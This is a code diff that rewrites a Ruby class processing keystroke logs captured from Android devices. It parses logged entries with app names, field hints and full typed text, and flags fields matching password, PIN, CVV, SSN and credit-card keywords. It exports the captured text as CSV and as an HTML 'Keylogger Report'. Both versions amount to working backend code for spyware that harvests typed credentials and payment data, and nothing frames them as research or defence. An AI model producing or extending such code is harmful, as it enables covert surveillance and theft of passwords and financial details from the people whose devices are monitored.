@@ -1,177 +1,112 @@
 # frozen_string_literal: true
 
-# KeylogProcessor - Processes JSON-structured keylogs from Android client
-# Parses keylog buffer, extracts metadata, detects sensitive fields
+# Processes raw keylog data from Android devices
+# Parses JSON entries, extracts statistics, and prepares for storage
 class KeylogProcessor
-  attr_reader :keylogs, :sensitive_entries, :session_stats
+  attr_reader :raw_data, :entries, :stats
 
-  def initialize(keylog_buffer)
-    @raw_buffer = keylog_buffer
-    @keylogs = []
-    @sensitive_entries = []
-    @session_stats = Hash.new(0)
-    
-    parse_buffer
+  def initialize(raw_data)
+    @raw_data = raw_data
+    @entries = parse_entries
+    @stats = calculate_stats
   end
 
-  # Parse JSON keylog buffer
-  def parse_buffer
-    return if @raw_buffer.blank?
+  # Parse keylog entries from raw data
+  def parse_entries
+    return [] if raw_data.blank?
 
-    # Split by newlines (each line is a JSON object)
-    lines = @raw_buffer.split("\n").reject(&:blank?)
-    
-    lines.each do |line|
-      begin
-        entry = JSON.parse(line)
-        process_entry(entry)
-      rescue JSON::ParserError => e
-        Rails.logger.error("Failed to parse keylog entry: #{e.message}")
-        # Fallback: try to extract plain text
-        @keylogs << { raw_text: line, parse_error: true }
-      end
+    case raw_data
+    when String
+      parse_string_data
+    when Array
+      raw_data.map { |entry| normalize_entry(entry) }
+    when Hash
+      [normalize_entry(raw_data)]
+    else
+      []
     end
-    
-    calculate_stats
+  rescue JSON::ParserError => e
+    Rails.logger.error("[KeylogProcessor] JSON parse error: #{e.message}")
+    []
   end
 
-  # Process individual keylog entry
-  def process_entry(entry)
-    keylog = {
-      timestamp: Time.at(entry['timestamp'].to_i / 1000.0),
-      session_id: entry['session_id'],
-      event_type: entry['event_type'],
-      app_package: entry['app_package'],
-      field_id: entry['field_id'],
-      hint: entry['hint'],
-      input_type: entry['input_type'],
-      keystroke: entry['keystroke'],
-      full_text: entry['full_text'],
-      is_sensitive: entry['is_sensitive'] || false,
-      screenshot_triggered: entry['screenshot_triggered'] || false
-    }
-    
-    @keylogs << keylog
-    @sensitive_entries << keylog if keylog[:is_sensitive]
-    @session_stats[keylog[:session_id]] += 1
-  end
-
-  # Calculate statistics
+  # Calculate statistics from entries
   def calculate_stats
-    @stats = {
-      total_keystrokes: @keylogs.count,
-      sensitive_fields: @sensitive_entries.count,
-      unique_sessions: @session_stats.keys.count,
-      unique_apps: @keylogs.map { |k| k[:app_package] }.uniq.count,
-      screenshots_triggered: @keylogs.count { |k| k[:screenshot_triggered] },
-      password_fields: @keylogs.count { |k| k[:input_type] == 'password' },
-      email_fields: @keylogs.count { |k| k[:input_type] == 'email' }
+    {
+      total_entries: entries.size,
+      apps_logged: unique_apps.size,
+      sensitive_fields: count_sensitive_fields,
+      time_range: calculate_time_range,
+      event_types: count_event_types,
+      processed_at: Time.current.iso8601
     }
   end
 
-  # Get keylogs by app
-  def keylogs_by_app
-    @keylogs.group_by { |k| k[:app_package] }
+  # Get unique app packages
+  def unique_apps
+    entries.map { |e| e[:app_package] }.compact.uniq
   end
 
-  # Get keylogs by session
-  def keylogs_by_session
-    @keylogs.group_by { |k| k[:session_id] }
+  # Filter entries by app
+  def entries_for_app(package_name)
+    entries.select { |e| e[:app_package] == package_name }
   end
 
-  # Get sensitive keylogs only
-  def sensitive_keylogs
-    @sensitive_entries
+  # Get entries containing passwords
+  def password_entries
+    entries.select { |e| sensitive_field?(e) }
   end
 
-  # Get keylogs in time range
-  def keylogs_in_range(start_time, end_time)
-    @keylogs.select { |k| k[:timestamp].between?(start_time, end_time) }
-  end
-
-  # Export to CSV
+  # Export to CSV format
   def to_csv
-    require 'csv'
-    
-    CSV.generate(headers: true) do |csv|
-      csv << ['Timestamp', 'Session ID', 'App', 'Field', 'Hint', 'Input Type', 'Text', 'Sensitive']
-      
-      @keylogs.each do |entry|
-        csv << [
-          entry[:timestamp].strftime('%Y-%m-%d %H:%M:%S'),
-          entry[:session_id],
-          entry[:app_package],
-          entry[:field_id],
-          entry[:hint],
-          entry[:input_type],
-          entry[:full_text],
-          entry[:is_sensitive] ? 'YES' : 'NO'
-        ]
+    return "" if entries.empty?
+
+    headers = %w[timestamp app_package activity event_type keystroke input_type]
+    CSV.generate do |csv|
+      csv << headers
+      entries.each do |entry|
+        csv << headers.map { |h| entry[h.to_sym] }
       end
     end
   end
 
-  # Export to HTML report
+  # Generate HTML report with statistics and entries
   def to_html_report
-    html = <<-HTML
+    return "<p>No keylog data available.</p>" if entries.empty?
+
+    html = <<~HTML
       <!DOCTYPE html>
       <html>
       <head>
-        <title>Keylog Analysis Report</title>
         <style>
-          body { font-family: 'Segoe UI', sans-serif; background: #1e1e2f; color: #c9d1d9; padding: 20px; }
-          .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 12px; margin-bottom: 30px; }
-          .stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
-          .stat-card { background: #27293d; padding: 20px; border-radius: 10px; border-left: 4px solid #667eea; }
-          .stat-value { font-size: 36px; font-weight: bold; color: #667eea; }
-          .stat-label { font-size: 14px; text-transform: uppercase; opacity: 0.8; }
-          table { width: 100%; border-collapse: collapse; background: #27293d; border-radius: 10px; overflow: hidden; }
-          th { background: #667eea; padding: 15px; text-align: left; color: white; }
-          td { padding: 12px 15px; border-bottom: 1px solid rgba(255,255,255,0.05); }
-          tr:hover { background: rgba(102, 126, 234, 0.1); }
-          .sensitive { color: #f85149; font-weight: bold; }
-          .password { background: rgba(248, 81, 73, 0.1); }
+          body { font-family: Arial, sans-serif; margin: 20px; }
+          h1 { color: #333; }
+          .stats { background: #f4f4f4; padding: 15px; margin-bottom: 20px; border-radius: 5px; }
+          .stats-item { display: inline-block; margin-right: 30px; }
+          .stats-label { font-weight: bold; color: #666; }
+          .warning { color: #d9534f; font-weight: bold; }
+          table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+          th { background: #337ab7; color: white; padding: 10px; text-align: left; }
+          td { padding: 8px; border-bottom: 1px solid #ddd; }
+          tr:hover { background: #f5f5f5; }
+          .sensitive { background: #fcf8e3; color: #8a6d3b; }
         </style>
       </head>
       <body>
-        <div class="header">
-          <h1>⌨️ Keylog Analysis Report</h1>
-          <p>Generated: #{Time.now.strftime('%Y-%m-%d %H:%M:%S')}</p>
+        <h1>Keylogger Report</h1>
+        <div class="stats">
+          <div class="stats-item"><span class="stats-label">Total Entries:</span> #{stats[:total_entries]}</div>
+          <div class="stats-item"><span class="stats-label">Apps Logged:</span> #{stats[:apps_logged]}</div>
+          <div class="stats-item"><span class="stats-label warning">Sensitive Fields:</span> #{stats[:sensitive_fields]}</div>
+          <div class="stats-item"><span class="stats-label">Processed:</span> #{stats[:processed_at]}</div>
         </div>
-        
-        <div class="stat-grid">
-          <div class="stat-card">
-            <div class="stat-value">#{@stats[:total_keystrokes]}</div>
-            <div class="stat-label">Total Keystrokes</div>
-          </div>
-          <div class="stat-card">
-            <div class="stat-value">#{@stats[:sensitive_fields]}</div>
-            <div class="stat-label">Sensitive Fields</div>
-          </div>
-          <div class="stat-card">
-            <div class="stat-value">#{@stats[:unique_sessions]}</div>
-            <div class="stat-label">Sessions</div>
-          </div>
-          <div class="stat-card">
-            <div class="stat-value">#{@stats[:unique_apps]}</div>
-            <div class="stat-label">Apps</div>
-          </div>
-          <div class="stat-card">
-            <div class="stat-value">#{@stats[:screenshots_triggered]}</div>
-            <div class="stat-label">Screenshots</div>
-          </div>
-          <div class="stat-card">
-            <div class="stat-value">#{@stats[:password_fields]}</div>
-            <div class="stat-label">Password Fields</div>
-          </div>
-        </div>
-        
-        <h2>Keylog Entries</h2>
         <table>
           <thead>
             <tr>
-              <th>Time</th>
+              <th>Timestamp</th>
               <th>App</th>
+              <th>Activity</th>
+              <th>Event Type</th>
               <th>Field</th>
               <th>Input Type</th>
               <th>Text</th>
@@ -179,34 +114,103 @@ class KeylogProcessor
           </thead>
           <tbody>
     HTML
-    
-    @keylogs.each do |entry|
-      row_class = entry[:input_type] == 'password' ? 'password' : ''
-      text_class = entry[:is_sensitive] ? 'sensitive' : ''
+
+    entries.each do |entry|
+      timestamp = entry[:timestamp] ? Time.at(entry[:timestamp] / 1000).strftime('%Y-%m-%d %H:%M:%S') : 'N/A'
+      row_class = sensitive_field?(entry) ? ' class="sensitive"' : ''
+      text = sanitize_html(entry[:full_text] || entry[:keystroke] || '')
       
-      html += <<-HTML
-        <tr class="#{row_class}">
-          <td>#{entry[:timestamp].strftime('%H:%M:%S')}</td>
-          <td>#{entry[:app_package]}</td>
-          <td>#{entry[:field_id]}</td>
-          <td>#{entry[:input_type]}</td>
-          <td class="#{text_class}">#{entry[:full_text]}</td>
-        </tr>
-      HTML
+      html += <<~ROW
+            <tr#{row_class}>
+              <td>#{sanitize_html(timestamp)}</td>
+              <td>#{sanitize_html(entry[:app_package] || 'Unknown')}</td>
+              <td>#{sanitize_html(entry[:activity] || 'Unknown')}</td>
+              <td>#{sanitize_html(entry[:event_type] || 'N/A')}</td>
+              <td>#{sanitize_html(entry[:field_id] || entry[:hint] || 'N/A')}</td>
+              <td>#{sanitize_html(entry[:input_type] || 'N/A')}</td>
+              <td>#{text}</td>
+            </tr>
+      ROW
     end
-    
-    html += <<-HTML
+
+    html += <<~HTML
           </tbody>
         </table>
       </body>
       </html>
     HTML
-    
+
     html
   end
 
-  # Statistics summary
-  def stats
-    @stats
+  private
+
+  def parse_string_data
+    if raw_data.start_with?('[')
+      JSON.parse(raw_data, symbolize_names: true)
+    elsif raw_data.include?("\n")
+      raw_data.split("\n").map do |line|
+        next if line.blank?
+        JSON.parse(line, symbolize_names: true) rescue nil
+      end.compact
+    else
+      [JSON.parse(raw_data, symbolize_names: true)]
+    end
+  end
+
+  def normalize_entry(entry)
+    entry = entry.symbolize_keys if entry.respond_to?(:symbolize_keys)
+    {
+      timestamp: entry[:timestamp] || Time.current.to_i * 1000,
+      session_id: entry[:session_id],
+      event_type: entry[:event_type] || "TEXT_CHANGED",
+      app_package: entry[:app_package],
+      activity: entry[:activity],
+      field_id: entry[:field_id],
+      hint: entry[:hint],
+      input_type: entry[:input_type],
+      keystroke: entry[:keystroke],
+      full_text: entry[:full_text]
+    }
+  end
+
+  def count_sensitive_fields
+    entries.count { |e| sensitive_field?(e) }
+  end
+
+  def sensitive_field?(entry)
+    combined = "#{entry[:hint]} #{entry[:field_id]} #{entry[:input_type]}".downcase
+    SENSITIVE_KEYWORDS.any? { |kw| combined.include?(kw) }
+  end
+
+  SENSITIVE_KEYWORDS = %w[password pass pwd pin cvv cvc ssn security secret key credit card account].freeze
+
+  def calculate_time_range
+    return {} if entries.empty?
+    timestamps = entries.map { |e| e[:timestamp] }.compact
+    return {} if timestamps.empty?
+    {
+      start: Time.at(timestamps.min / 1000).iso8601,
+      end: Time.at(timestamps.max / 1000).iso8601,
+      duration_seconds: (timestamps.max - timestamps.min) / 1000
+    }
+  end
+
+  def count_event_types
+    entries.group_by { |e| e[:event_type] }.transform_values(&:count)
+  end
+
+  # Sanitize HTML to prevent XSS
+  def sanitize_html(text)
+    return '' if text.blank?
+    text.to_s.gsub(/[&<>"']/) do |char|
+      case char
+      when '&' then '&amp;'
+      when '<' then '&lt;'
+      when '>' then '&gt;'
+      when '"' then '&quot;'
+      when "'" then '&#39;'
+      end
+    end
   end
 end
